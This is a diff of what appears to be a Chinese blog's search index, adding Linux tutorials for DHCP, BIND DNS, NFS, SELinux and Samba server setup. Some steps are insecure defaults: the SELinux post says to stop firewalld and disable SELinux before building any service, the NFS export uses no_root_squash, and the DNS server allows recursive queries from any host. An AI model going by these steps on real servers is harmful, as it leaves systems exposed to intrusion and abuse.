@@ -74,20 +74,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pip 更换源</title>
-    <url>/2021/02/09/Python/pip/pip/</url>
-    <content><![CDATA[<h2 id="pip-更换成国内源"><a href="#pip-更换成国内源" class="headerlink" title="pip 更换成国内源"></a>pip 更换成国内源</h2><p>在 <code>C:\Users\【用户名】\AppData\Roaming</code> 目录下新建 <code>pip</code> 文件夹，然后在文件夹内新建 <code>pip.ini</code> 文件</p>
-<p>文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 60000</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">use-mirrors &#x3D; true</span><br><span class="line">mirrors &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
-<h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  阿里云</span><br><span class="line">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">#  中国科技大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  豆瓣(douban)</span><br><span class="line">http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line">#  清华大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  中国科学技术大学</span><br><span class="line">http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ubuntu配置 Shadowsocks</title>
     <url>/2021/02/11/%E4%BB%A3%E7%90%86/Shadowsocks/Shadowsocks/</url>
     <content><![CDATA[<h2 id="安装所需包"><a href="#安装所需包" class="headerlink" title="安装所需包"></a>安装所需包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  更新本地已安装软件</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade -y</span><br><span class="line"></span><br><span class="line">#  安装 python-pip、Shadowsocks</span><br><span class="line">sudo apt-get install python3-pip -y</span><br><span class="line">pip3 install https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;shadowsocks&#x2F;archive&#x2F;master.zip</span><br><span class="line">sudo apt-get install shadowsocks</span><br><span class="line"></span><br><span class="line">#  查看 Shadowsocks 版本</span><br><span class="line">sudo ssserver --version</span><br><span class="line"></span><br><span class="line">#  修改 Shadowsocks 相关文件权限，并备份配置文件</span><br><span class="line">sudo chmod 557 &#x2F;var&#x2F;run&#x2F;shadowsocks.pid</span><br><span class="line">sudo chmod 557 &#x2F;var&#x2F;log&#x2F;shadowsocks.log</span><br><span class="line">sudo cp -p &#x2F;etc&#x2F;shadowsocks&#x2F;config.json &#x2F;etc&#x2F;shadowsocks&#x2F;config.json.bak</span><br></pre></td></tr></table></figure>
@@ -118,6 +104,381 @@
       <tags>
         <tag>Linux</tag>
         <tag>proxy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DHCP</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>DHCP（动态主机配置协议）是一个局域网的网络协议。为主机分配 IP 地址。</p>
+<p>安装：<code>yum -y install dhcp</code><br>默认端口：<code>67/68</code><br>主配置文件：<code>/etc/dhcp/dhcpd.conf</code><br>模板文件：<code>/usr/share/doc/dhcp-4.2.5/dhcpd.conf.example</code><br>执行程序：<code>/usr/sbin/dhcpd、/usr/sbin/dhcrelay</code><br>执行参数配置：<code>/etc/sysconfig/dhcpd</code><br>查看租约文件：<code>/var/lib/dhcpd/dhcpd.lease</code><br>网络服务的排错日志：<code>/var/log/messages</code></p>
+<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log-facility local7;    #  指定日志文件</span><br><span class="line">ddns-update-style none; #  设置 DNS 的更新方式（可用参数：standard、interim、none）</span><br><span class="line">ignore client-updates;  #  不允许客户端更新 DNS 记录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;	#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;		#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、拷贝模板文件"><a href="#1、拷贝模板文件" class="headerlink" title="1、拷贝模板文件"></a>1、拷贝模板文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  删除原配置文件（原配置文件内无参数）</span><br><span class="line">rm -f &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  拷贝模板文件并更名为配置文件</span><br><span class="line">cp -p &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp-4.2.5&#x2F;dhcpd.conf.example &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  备份配置文件</span><br><span class="line">cp -p &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf.bak_2020.11.13</span><br></pre></td></tr></table></figure>
+<h3 id="2、编辑配置文件"><a href="#2、编辑配置文件" class="headerlink" title="2、编辑配置文件"></a>2、编辑配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  可在配置文件内只保留如下内容（配置文件内有该内容）</span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;	#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;		#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DNS</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/</url>
+    <content><![CDATA[<h2 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p><strong>一、简介</strong></p>
+<p>把域名翻译成IP地址的软件称为域名系统，即 DNS<br>默认端口号：<code>53</code></p>
+<p><strong>默认配置文件路径：</strong></p>
+<p>主要配置文件（定义 bind 服务程序的运行）： <code>/etc/named.conf</code><br>区域配置文件（保存域名和IP地址对应关系的所在位置）： <code>/etc/named.rfc1912.zones</code><br>数据文件目录： <code>/var/named</code></p>
+<p>DNS域名解析的配置文件（系统自带）： <code>/etc/resolv.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  resolv.conf 参数详解</span><br><span class="line"></span><br><span class="line">nameserver	#  定义 DNS 服务器的 IP 地址（查询时按照 namserver 在文件中的顺序进行）</span><br><span class="line">domain		#  定义本地域名</span><br><span class="line">search		#  定义域名的搜索列表（当查询的域名没找到时，则从该参数声明的域中按前后顺序查找）</span><br><span class="line">sortlist	#  对返回的域名进行排序</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h2><p><strong>环境：</strong></p>
+<p>centos 7，IP：10.1.82.232</p>
+<h3 id="1、安装相关包"><a href="#1、安装相关包" class="headerlink" title="1、安装相关包"></a>1、安装相关包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 dns 相关包（bind：DNS 服务程序，bind-utils：提供 DNS 工具包（域名解析和DNS调试））</span><br><span class="line">yum -y install bind bind-utils</span><br></pre></td></tr></table></figure>
+<h3 id="2、编辑主要配置文件"><a href="#2、编辑主要配置文件" class="headerlink" title="2、编辑主要配置文件"></a>2、编辑主要配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.conf     #  编辑 named.conf</span><br><span class="line"></span><br><span class="line">将    listen-on port 53 &#123; 127.0.0.1; &#125;;  跟  allow-query     &#123; localhost; &#125;;</span><br><span class="line">改为  listen-on port 53 &#123; any; &#125;;        和  allow-query     &#123; any; &#125;; 即可</span><br></pre></td></tr></table></figure>
+<p><code>named.conf</code> 配置文件详解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  named.conf 配置文件详解</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; named.conf</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Provided by Red Hat bind package to configure the ISC BIND named(8) DNS</span><br><span class="line">&#x2F;&#x2F; server as a caching only nameserver (as a localhost DNS resolver only).</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind*&#x2F;sample&#x2F; for example named configuration files.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See the BIND Administrator&#39;s Reference Manual (ARM) for details about the</span><br><span class="line">&#x2F;&#x2F; configuration located in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind-&#123;version&#125;&#x2F;Bv9ARM.html</span><br><span class="line"></span><br><span class="line">options &#123;</span><br><span class="line">	listen-on port 53 &#123; any; &#125;;                   #  允许所有 IP 监听本机 53 端口（即所有用户能与本机的 DNS 进行通信）</span><br><span class="line">	listen-on-v6 port 53 &#123; ::1; &#125;;                #  IPV6 监听地址</span><br><span class="line">	directory 	&quot;&#x2F;var&#x2F;named&quot;;		              #  服务器的工作目录</span><br><span class="line">	dump-file 	&quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;cache_dump.db&quot;;  #  当执行 rndc dumpdb 时服务器 dump 文件的路径</span><br><span class="line">	statistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_stats.txt&quot;;		    #  当服务器接收到 rndc stats 命令时，追加统计数据的文件路径</span><br><span class="line">	memstatistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_mem_stats.txt&quot;;	#  当退出服务器时，会将服务器的统计信息写道文件中</span><br><span class="line">	allow-query     &#123; any; &#125;;		              #  允许所有 IP 进行 DNS 查询</span><br><span class="line"></span><br><span class="line">	&#x2F;* </span><br><span class="line">	 - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.</span><br><span class="line">	 - If you are building a RECURSIVE (caching) DNS server, you need to enable </span><br><span class="line">	   recursion. </span><br><span class="line">	 - If your recursive DNS server has a public IP address, you MUST enable access </span><br><span class="line">	   control to limit queries to your legitimate users. Failing to do so will</span><br><span class="line">	   cause your server to become part of large scale DNS amplification </span><br><span class="line">	   attacks. Implementing BCP38 within your network would greatly</span><br><span class="line">	   reduce such attack surface </span><br><span class="line">	*&#x2F;</span><br><span class="line">	recursion yes;		    #  允许进行递归搜索</span><br><span class="line"></span><br><span class="line">	dnssec-enable yes;      #  开启 DNSSEC 开关</span><br><span class="line">	dnssec-validation yes;	#  开启 DNSSEC 确认开关</span><br><span class="line"></span><br><span class="line">	&#x2F;* Path to ISC DLV key *&#x2F;</span><br><span class="line">	bindkeys-file &quot;&#x2F;etc&#x2F;named.iscdlv.key&quot;;		    #  加密用的 key</span><br><span class="line"></span><br><span class="line">	managed-keys-directory &quot;&#x2F;var&#x2F;named&#x2F;dynamic&quot;;	#  管理密钥的路径</span><br><span class="line"></span><br><span class="line">	pid-file &quot;&#x2F;run&#x2F;named&#x2F;named.pid&quot;;		        #  服务器记录进程 ID 的文件路径</span><br><span class="line">	session-keyfile &quot;&#x2F;run&#x2F;named&#x2F;session.key&quot;;	    #  会话密钥文件</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">logging &#123;	#  定义 bing 服务的日志</span><br><span class="line">        channel default_debug &#123;		    #  日志输出方式</span><br><span class="line">                file &quot;data&#x2F;named.run&quot;;  #  输出到指定文件</span><br><span class="line">                severity dynamic;	    #  按照服务器当前的 debug 级别记录日志</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;.&quot; IN &#123;			#  定义域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type hint;		    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;named.ca&quot;;	#  指定存放 DNS 记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#  包含区域配置文件，用于设置正反向区域（也可在当前文件中配置正反向区域）</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.rfc1912.zones&quot;;	#  如果把该行注释则 named.rfc1912.zones 文件内的配置无效</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.root.key&quot;;		#  根区域的 key 文件（与事务签名相关）</span><br></pre></td></tr></table></figure>
+<h3 id="3、编辑区域配置文件"><a href="#3、编辑区域配置文件" class="headerlink" title="3、编辑区域配置文件"></a>3、编辑区域配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.rfc1912.zones	#  编辑区域文件</span><br><span class="line"></span><br><span class="line">在文件末尾添加正反向区域</span><br><span class="line">zone &quot;test.com&quot; IN &#123;		#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type master;		    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;test.com.zone&quot;;	#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">	allow-update &#123; none; &#125;;	#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;	#  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type master;			        #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;10.1.82.zone&quot;;		#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">	allow-update &#123; none; &#125;;		#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="4、配置正向区域"><a href="#4、配置正向区域" class="headerlink" title="4、配置正向区域"></a>4、配置正向区域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  复制 named.localhost 文件及其属性并改名为 test.com.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.localhost &#x2F;var&#x2F;named&#x2F;test.com.zone</span><br><span class="line"></span><br><span class="line">#  配置正向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@	IN SOA	@ test.com. (</span><br><span class="line">					0	; serial</span><br><span class="line">					1D	; refresh</span><br><span class="line">					1H	; retry</span><br><span class="line">					1W	; expire</span><br><span class="line">					3H )	; minimum</span><br><span class="line">	NS	@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">	A	10.1.82.232      #  域名指向的 IP</span><br><span class="line">www	A	10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">	AAAA	::1</span><br></pre></td></tr></table></figure>
+<h3 id="5、配置反向区域"><a href="#5、配置反向区域" class="headerlink" title="5、配置反向区域"></a>5、配置反向区域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  复制 named.loopback 文件及其属性并改名为 10.1.82.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.loopback &#x2F;var&#x2F;named&#x2F;10.1.82.zone</span><br><span class="line"></span><br><span class="line">#  配置反向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@	IN SOA	@ test.com. (</span><br><span class="line">					0	; serial</span><br><span class="line">					1D	; refresh</span><br><span class="line">					1H	; retry</span><br><span class="line">					1W	; expire</span><br><span class="line">					3H )	; minimum</span><br><span class="line">	NS	@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">	A	10.1.82.232      #  域名指向的 IP</span><br><span class="line">www	A	10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">	AAAA	::1</span><br><span class="line">232	PTR	www.test.com.    #  完整的域名跟对应的 IP 后缀（域名后面的点必须有）</span><br></pre></td></tr></table></figure>
+<h3 id="6、设置-DNS-解析"><a href="#6、设置-DNS-解析" class="headerlink" title="6、设置 DNS 解析"></a>6、设置 DNS 解析</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;resolv.conf	    #  编辑 DNS 域名解析配置文件</span><br><span class="line"></span><br><span class="line">nameserver 10.1.82.232      #  在 resolv.conf 文件末尾添加该行</span><br></pre></td></tr></table></figure>
+<p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p>
+<p>配置完后使用 nslookup dig 等工具进行测试即可</p>
+<hr>
+<h2 id="配置主从-DNS"><a href="#配置主从-DNS" class="headerlink" title="配置主从 DNS"></a>配置主从 DNS</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><strong>环境：</strong></p>
+<p>centos 7（主），IP：10.1.82.232<br>centos 7（从），IP：10.1.82.235</p>
+<h3 id="二、实例-1"><a href="#二、实例-1" class="headerlink" title="二、实例"></a>二、实例</h3><p>主服务器的配置文件照上正常配置即可</p>
+<p>从服务器只需在区域配置文件末尾中添加如下配置即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zone &quot;test.com&quot; IN &#123;			#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;			    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;	    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;test.com.zone&quot;;	#  设置主服务器正向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;	#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;        #  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;                     #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;	    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;10.1.82.zone&quot;;	    #  设置主服务器反向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;	#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p>
+<p>配置完后使用 nslookup dig 等工具进行测试即可</p>
+]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NFS</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>NFS</code>（网络文件系统）能通过网络让不同的机器、系统共享彼此的文件</p>
+<p>配置文件（默认为空文件）：<code>/etc/exports</code><br>管理命令：<code>/usr/sbin/exportfs</code><br>共享资源的日志文件：<code>/var/lib/nfs/*tab</code><br>客户端查询共享资源命令：<code>/usr/sbin/showmount</code></p>
+<p><code>NFS</code> 服务主要进程：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpc.nfsd	#  最主要的 NFS 进程，管理客户端是否可登录</span><br><span class="line">rpc.mountd	#  挂载和卸载 NFS 文件系统，包括权限管理</span><br><span class="line">rpc.lockkd	#  管理文件锁，避免同时写出错（非必要）</span><br><span class="line">rpc.statd	#  检查文件一致性，可修复文件（非必要）</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p><code>/etc/exports</code> 配置文件常用参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ro		#  只读</span><br><span class="line">rw		#  读写</span><br><span class="line">sync		#  将数据同步写入内存缓冲区与磁盘中（效率低，但可保证数据的一致性）</span><br><span class="line">async		#  将数据先保存在内存缓冲区中，必要时才写入磁盘</span><br><span class="line">insecure	#  允许客户端从大于 1024 的 TCP&#x2F;IP 端口连接服务器</span><br><span class="line">secure（默认）          #  限制客户端只能从小于 1024 的 TCP&#x2F;IP 端口连接旧服务器</span><br><span class="line">wdelay（默认）          #  检查是否有相关的写入操作，如有则将这些写入操作一起执行（该参数为默认参数）</span><br><span class="line">subtree_check（默认）   #  若输出目录是一个子目录，则 NFS 服务器将检查其父目录的权限</span><br><span class="line">no_subtree_check       #  即使输出目录是一个子目录，NFS 服务器也不检查其父目录的权限（可提高效率）</span><br><span class="line">no_wdelay       #  若有写入操作则立即执行（应与 sync 配合使用）</span><br><span class="line">root_squash     #  将来访问的 root 用户映射为匿名用户或用户组</span><br><span class="line">no_root_squash	#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br><span class="line">all_squash      #  所有访问用户都映射为匿名用户或用户组</span><br><span class="line">no_all_squash	#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br></pre></td></tr></table></figure>
+<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、编辑配置文件"><a href="#1、编辑配置文件" class="headerlink" title="1、编辑配置文件"></a>1、编辑配置文件</h3><p>配置文件格式为：<code>路径 + IP、掩码 + 参数</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  创建需共享的文件夹</span><br><span class="line">mkdir -p &#x2F;data&#x2F;web_data</span><br><span class="line">#  在 &#x2F;etc&#x2F;exports 配置文件中添加如下内容</span><br><span class="line">&#x2F;data&#x2F;web_data		192.168.1.0&#x2F;24(rw,no_root_squash)</span><br></pre></td></tr></table></figure>
+<h3 id="2、刷新配置"><a href="#2、刷新配置" class="headerlink" title="2、刷新配置"></a>2、刷新配置</h3><p>刷新配置：<code>exportfs -a</code></p>
+<h3 id="3、重启服务"><a href="#3、重启服务" class="headerlink" title="3、重启服务"></a>3、重启服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SELinux 防火墙</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/</url>
+    <content><![CDATA[<p><strong>注：</strong> 搭建服务前须关闭防火墙（否则会导致服务无法访问）</p>
+<h2 id="一、firewalld-防火墙"><a href="#一、firewalld-防火墙" class="headerlink" title="一、firewalld 防火墙"></a>一、firewalld 防火墙</h2><p>查看 firewalld 防火墙状态：<code>systemctl status firewalld</code><br>关闭 firewall 防火墙 <code>systemctl stop firewalld</code></p>
+<h2 id="二、SELinux-防火墙"><a href="#二、SELinux-防火墙" class="headerlink" title="二、SELinux 防火墙"></a>二、SELinux 防火墙</h2><p><strong>简介：</strong><br>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。</p>
+<p><strong>SELinux 分三种模式</strong>：<br>Enforcing（强制模式）、Permissive（警告模式）、Disabled（关闭模式）</p>
+<p>查看防火墙当前状态：<code>getenforce</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  关闭 SELinux 防火墙</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;selinux&#x2F;config		#  编辑 selinux 防火墙的配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># This file controls the state of SELinux on the system.</span><br><span class="line"># SELINUX&#x3D; can take one of these three values:</span><br><span class="line">#     enforcing - SELinux security policy is enforced.</span><br><span class="line">#     permissive - SELinux prints warnings instead of enforcing.</span><br><span class="line">#     disabled - No SELinux policy is loaded.</span><br><span class="line">SELINUX&#x3D;enforcing	#  需将此处更改为 disabled（默认为 enforcing）</span><br><span class="line"># SELINUXTYPE&#x3D; can take one of three two values:</span><br><span class="line">#     targeted - Targeted processes are protected,</span><br><span class="line">#     minimum - Modification of targeted policy. Only selected processes are protected. </span><br><span class="line">#     mls - Multi Level Security protection.</span><br></pre></td></tr></table></figure>
+<p>更改完后输入命令使其生效 <code>setenforce 0</code></p>
+]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Samba</title>
+    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Samba/Samba/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一种免费软件，由服务器及客户端程序构成。</p>
+<p>SMB 是在局域网上共享文件和打印机的一种通信协议</p>
+<p>默认端口号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp：139、445</span><br><span class="line">UDP：137、138</span><br></pre></td></tr></table></figure>
+<h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 Samba：<code>yum -y install samba</code><br>默认配置文件路径：<code>/etc/samba/smb.conf</code></p>
+<h3 id="可用变量"><a href="#可用变量" class="headerlink" title="可用变量"></a>可用变量</h3><p>变量名|描述|变量名|描述<br>:-:|:-|:-:|:-|:-<br>%a | 客户机的结构（只支持：Samba、WfWg、WinNT、Win95） | %d | 当前服务进程 ID<br>%I | 客户机的 IP | %P | 当前服务的根目录<br>%L | 服务器的 NETBIOS 名称 | %N | NIS 服务器名<br>%R | 采用的协议等级（值可以是 CORE，COREPLUS，LANMAN1, LANMAN2，NT1） | %S | 当前服务名<br>%T | 当前日期和时间 | %v | Samba 服务的版本号<br>%h | 运行 Samba 服务机器的主机名 | %H | 当前服务的用户的 Home 目录<br>%g | 当前用户所在的主工作组 | %G | 当前对话的用户的主工作组<br>%m | 客户机的 NETBIOS 名称 | %M | 客户机的主机名<br>%u | 当前服务的用户名 | %U | 当前对话的用户名</p>
